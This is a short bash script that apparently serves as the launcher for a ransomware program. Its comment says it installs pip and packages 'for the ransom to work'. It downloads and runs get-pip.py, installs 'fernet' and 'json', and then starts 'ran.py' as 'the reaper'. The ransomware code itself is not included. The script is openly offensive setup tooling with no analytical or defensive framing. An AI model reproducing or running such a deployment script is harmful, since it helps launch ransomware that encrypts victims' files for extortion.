# Download packages and pip for the ransom to work
url="https://bootstrap.pypa.io/get-pip.py"
echo "[+] Downloading the PIP script"
curl ${url} -o get-pip.py
echo "[+] Running the PIP script to setup"
python get-pip.py
echo "[+] PIP is now downloaded..."
#Listing the packages
declare -A packs
packs=(
  [fernet]="fernet"
  [json]="json"
)
# Loop through package list and install
echo "[!] Installing all the packages"
for i in ${!packs[@]}; do
  echo "[!] Installing ${packs[$i]}"
  python -m pip install ${packs[$i]}
done
echo "[!] Downloading is done. Running the reaper...."
python ran.py -t